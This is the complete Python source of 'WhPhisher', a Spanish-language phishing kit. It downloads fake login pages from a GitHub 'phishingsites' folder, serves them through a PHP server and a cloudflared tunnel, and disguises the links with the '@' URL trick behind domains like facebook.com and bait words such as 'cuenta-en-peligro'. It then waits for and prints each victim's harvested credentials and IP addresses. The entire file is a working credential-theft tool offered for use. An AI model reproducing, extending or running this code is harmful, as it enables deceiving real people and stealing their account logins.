# -*- coding: UTF-8 -*-
# Herramienta  : WhPhisher
# Author       : WhBeatZ

import os, sys, time, socket, json
from os import popen, system
from time import sleep

# Normal
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\33[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
bwhite="\033[1;37m"

nc="\033[00m"

version="1.0"

ask = bgreen + '[' + bwhite + '-' + bgreen + '] '+ bpurple
success = byellow + '[' + bwhite + '√' + byellow + '] '+bgreen
error = bblue + '[' + bwhite + '!' + bblue + '] '+bred
info= byellow + '[' + bwhite + '+' + byellow + '] '+ bcyan
info2= bgreen + '[' + bwhite + '•' + bgreen + '] '+ bpurple

# Logo
logo=f'''


{bcyan  }   banner

{byellow}----> {bcyan}By {bwhite}WhBeatZ {bcyan}Github {bwhite}WhBeatZ {byellow}<-----
{white}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'''

sites=["F3 Spanish" , "F3 English"]
pkgs=[ "php", "curl", "wget", "unzip" ]

socket.setdefaulttimeout(30)

root= popen("cd $HOME && pwd").read().strip()


# Check termux
if os.path.exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False

# Website chooser
def options():
    leng=len(sites)
    i=0
    j=int(leng/3)
    k=int((2*leng)/3)
    if leng%3!=0:
        j+=1
        k+=1
    m=j
    while i<m:
        print(green+'['+bwhite+str(i+1)+bgreen+'] '+bcyan+sites[i], end="")
        lew=len(sites[i])
        sp=22-lew
        if i<9:
            sp=sp+1
        for s in range(sp):
            print(" ",end="")
        print(green+'['+bwhite+str(j+1)+bgreen+'] '+bcyan+sites[j], end="")
        lew=len(sites[j])
        sp=16-lew
        for s in range(sp):
            print(" ",end="")
        if k<leng:
            print(green+'['+bwhite+str(k+1)+bgreen+'] '+bcyan+sites[k], end="")
        i+=1
        j+=1
        k+=1
        print()
    print()
    print(green+'['+bwhite+'x'+bgreen+']'+byellow+' Acerca de                  '+bgreen+'['+bwhite+'m'+bgreen+']'+byellow+' Mas herramientas       '+bgreen+'['+bwhite+'0'+bgreen+']'+byellow+' Salir')
    print()
    print()

# Process killer
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")


# Print logo
def slowprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.001)

# Print lines
def sprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)

# Internet Checker
def internet(host="8.8.8.8", port=53, timeout=5):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
    except socket.error:
        print(error+"Sin internet :c")
        time.sleep(2)
        internet()

# Install packages in Termux and Mac
def installer(pm):
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            sprint("\n"+info+"Instalando hacker :D!!"+pkgs[pkg].upper()+nc)
            system(pm+" install -y "+pkgs[pkg])

# Install packages in Linux
def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            sprint(info+"Instalando "+pkgs[pkg].upper()+nc)
            system("sudo "+pm+" install -y "+pkgs[pkg])


# Ask to mask url
def cuask(url):
    cust= input("\n"+ask+bcyan+"Pulsa (" +bwhite+ "y" +bcyan+") para personalizar el" +byellow+ " link" +bcyan+" o (" +bwhite+ "ENTER" +bcyan+ ") para continuar sin hacer cambios" +byellow+ " -->" +bwhite+ "  ")
    if not cust=="":
        masking(url)
    waiter()

# Polite Exit
def pexit():
    killer()
    sprint("\n"+info2+bcyan+"Gracias por usar " +bwhite+ "WhPhisher! " +bcyan+ "Sigueme en mi Insta, para mas herramientas o dudas :D " +byellow+ "--> " +bwhite+ "WhBeatZ" +bcyan+ " :D\n"+nc)
    exit(0)


# Info about tool
def about():
    system("clear")
    slowprint(logo)
    print(bcyan+'[Nombre de la herramienta]  '+bpurple+' :[WhPhisher] ')
    print(bcyan+'[Version]   '+bpurple+'                 :[2.5]')
    print(bcyan+'[Author]    '+bpurple+'                 :[WhBeatZ] ')
    print(bcyan+'[Github]    '+bpurple+'                 :[https://github.com/WhBeatZ] ')
    print(bcyan+'[Instagram] '+bpurple+'                 :[WhBeatZ]  ')

    print()
    print(bgreen+'['+bwhite+'0'+bgreen+']'+byellow+' Salir                     '+     bgreen+'['+bwhite+'99'+bgreen+']'+byellow+'  Menu Principal       ')
    print()
    abot= input("\n > ")
    if abot== "0":
        pexit()
    else:
        main()

# First function main
def main():
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            system("pkg install proot -y")
            system("pkg install curl")
            system("pkg install ssh")
            system("pkg install openssh")
            system("pkg install bash")
            system("pkg upgrade && update")
    if True:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
                    sprint("\n"+info+"Installing "+pkgs[pkg].upper()+nc)
                    system("sudo pacman -S "+pkgs[pkg]+" --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            sprint("\n"+error+"Unsupported package manager. Install packages manually!"+nc)
            exit(1)
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(error+"PHP cannot be installed. Install it manually!")
        exit(1)
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(error+"Unzip cannot be installed. Install it manually!")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(error+"Curl cannot be installed. Install it manually!")
        exit(1)
    killer()
    x=popen("uname -m").read()
    y=popen("uname").read()
    if not os.path.isfile(root+"/.cffolder/cloudflared"):
        sprint("\n"+info+"Descargando Cloudflare :D ....."+nc)
        internet()
        system("rm -rf cloudflared cloudflared.tgz")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
            elif x.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
            elif x.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
            else:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
                system("tar -zxf cloudflared.tgz > /dev/null 2>&1 && rm -rf cloudflared.tgz")
            elif x.find("arm64")!=-1:
                print(f"{error}Cloudflared not available for device architecture!")
                sleep(3)
            else:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("mkdir $HOME/.cffolder")
        system("mv -f cloudflared $HOME/.cffolder")
        if sudo:
            system("chmod +x $HOME/.cffolder/cloudflared")
        else:
            system("chmod +x $HOME/.cffolder/cloudflared")
    if system("pidof php > /dev/null 2>&1")==0:
        sprint(error+"Previous php still running! Please restart terminal and try again"+nc)
        exit()

    while True:
        if os.path.exists("/.site"):
            system("rm -rf $HOME/.site && cd $HOME && mkdir .site")
            break
        else:
            system("cd $HOME && mkdir .site")
            break
    while True:
        os.system("clear")
        slowprint(logo)
        options()

        choose= input(ask+"Seleciona un numero :) > "+nc)
        if choose=="1" or choose == "01":
            folder="f3_spanish"
            mask="https://f3-preguntas-spanish"
            requirements(folder,mask)
        elif choose == "2" or choose == "02":
            folder="f3_english"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)
        elif choose == "66":
            customfol()
        elif choose == "x" or choose == "X":
            about()
        elif choose == "m" or choose == "M":
            main()
        elif choose=="0":
            pexit()
        else:
            sprint("\n"+error+"No disponible :v")
            main()

# Copy website files from custom location
def customfol():
    fol=input("\n"+ask+"Enter the directory > "+green)
    if os.path.exists(fol):
        if os.path.isfile(fol+"/index.php"):
            system("cd "+fol+" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site")
            server()
        else:
            sprint(error+"Index.php required but not found!")
            main()
    else:
        sprint(error+"Directory do not exists!")
        main()

# 2nd function checking requirements and download files 
def requirements(folder,mask):
    if os.path.isfile("websites.zip"):
        system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
        system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
        os.remove("websites.zip")
    while True:
        if os.path.exists(root+"/.websites/"+folder):
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
        else:
            internet()
            sprint("\n"+info+"Desccargando filas requeridas :D.....\n")
            system("rm -rf site.zip")
            system("wget -q --show-progress https://github.com/WhBeatZ/files-ipcollector/raw/main/phishingsites/"+folder+".zip -O site.zip")
            if not os.path.exists("/.websites"):
                system("cd $HOME && mkdir .websites")
            system("cd $HOME/.websites && mkdir "+folder)
            system("unzip site.zip -d $HOME/.websites/"+folder)
            os.remove("site.zip")
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
    with open(".info.txt", "w") as inform:
        inform.write(mask)
    system("mv -f .info.txt $HOME/.site")
    server()

# Start server and tunneling
def server():
    system("clear")
    slowprint(logo)
    if termux:
        sprint("\n"+info+"WhPhisher, la mejor herramienta de phishing :D")
        sleep(1)
    sprint("\n"+info2+"Iniciando el servidor PHP en localhost:8080....")
    internet()
    system("cd $HOME/.site && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
    sleep(2)
    while True:
        if not system("curl --output /dev/null --silent --head --fail 127.0.0.1:8080"):
            sprint("\n"+info+"El servidor PHP se inició correctamente :)")
            break
        else:
            sprint(error+"PHP Error")
            killer()
            exit(1)
    sprint("\n"+info2+"Iniciando tunneling con la misma direccion :D.....")
    internet()
    system("rm -fr $HOME/.cffolder/log.txt")
    while True:
        if system("command -v termux-chroot > /dev/null 2>&1")==0:
            system("cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
            break
        else:
            system("cd $HOME/.cffolder && ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
            break
    sleep(9)
    cflink=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
    if cflink.find("cloudflare")!=-1:
        cfcheck=True
    else:
        cfcheck=False
    while True:
        if cfcheck:
            url_manager(cflink, "1" , "2")
            cuask(cflink)
            break
        elif not cfcheck:
            url_manager(cflink, "1" , "2")
            cuask(cflink)

# Optional function for ngrok url masking
def masking(url):
    website= "https://is.gd/create.php\?format\=simple\&url\="+url
    internet()
    main1= os.popen("curl -s "+website)
    main2=main1.read()
    if not main2.find("gd")!=-1:
        sprint(error+"Servicio no disponible :c")
        waiter()
    main= main2.replace("https://", "")
    domain= input("\n"+ask+"Escribe el dominio (Ejemplo: facebook.com, snapchat.com > ")
    if domain=="":
        sprint("\n"+error+"Como??")
        bait= input("\n"+ask+"Escribe palabras que describan el link, usando como espacio un - (Ejemplo: inicia-sesion, cuenta-en-peligro) > ")
        if (bait==""):
            sprint("\n"+error+"No entendi :c!")
            sprint("\n"+success+"Tu link es > https://"+ main)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Mal escrito!")
            waiter()
        final= "https://"+bait+"@"+main
        sprint("\n"+success+"Tu link es > "+ final)
        waiter()
    if (domain.find("http://")!=-1 or domain.find("https://")!=-1):
        bait= input("\n"+ask+"Escribe palabras que describan el link, usando como espacio un - (Ejemplo: inicia-sesion, cuenta-en-peligro) > ")
        if (bait==""):
            sprint("\n"+error+"No entendi :c!")
            final= domain+"@"+main
            sprint("\n"+success+"Tu link es > "+ final)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"No entendi :c!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Tu link es > "+ final)
        waiter()
    else:
        domain= "https://"+domain
        bait= input("\n"+ask+"Escribe palabras que describan el link, usando como espacio un - (Ejemplo: inicia-sesion, cuenta-en-peligro) > ")
        if bait=="":
            sprint("\n"+error+"No entendi :c!")
            final= domain+"@"+main
            sprint("\n"+success+"Tu link es > "+ final)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"No entendi!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Tu link es > "+ final)
        waiter()

# Output urls
def url_manager(url,num1,num2):
    internet()
    sprint("\n"+success+"Tus links se han generado :D: \n")
    system("rm -rf $HOME/.site/ip.txt")
    print(info2+"URL "+num1+" > "+bwhite+url)
    if os.path.isfile(root+"/.site/.info.txt"):
        with open(root+"/.site/.info.txt", "r") as inform:
            masked=inform.read()
            print(info2+"URL "+num2+" > "+bwhite+masked.strip()+"@"+url.replace("https://",""))


# Last function capturing credentials
def waiter():
    sprint("\n"+info+bpurple+"Esperando inicio de sesion...." +bcyan+ " Pulsa "+bred+ "Ctrl+C" +bcyan+" para salir :D")
    try:
        while True:
            if os.path.isfile(root+"/.site/usernames.txt"):
                print("\n\n"+success+bgreen+"Credenciales de la Victima encontradas!\n\007")
                with open(root+"/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    j=0
                    o=len(userdata)
                    while j<o:
                        print(bcyan+'['+bgreen+'*'+bcyan+'] '+byellow+userdata[j],end="")
                        j+=1
                print("\n"+info+"Guardado en usernames.txt")
                print("\n"+info+bblue+"Waiting for next....."+bcyan+ "Pulsa "+bred+ "Ctrl+C" +bcyan+ " para salir :D")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                os.remove(root+"/.site/usernames.txt")
            sleep(0.75)
            if os.path.isfile(root+"/.site/ip.txt"):
                os.system("clear")
                print(logo)
                print("\n\n"+success+bgreen+"IP de la victima encontrada!\n\007")
                with open(root+"/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    h=0
                    p=len(ipdata)
                    while h<p:
                        print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h], end="")
                        h+=1
                print("\n"+info+"Guardado en ip.txt")
                print("\n"+info+blue+"Esperando mas informacion "+cyan+ "Pulsa "+red+ "Ctrl+C"+cyan+" para salir")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                os.system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        os.system("stty -echoctl")
        main()
    except KeyboardInterrupt:
        pexit()
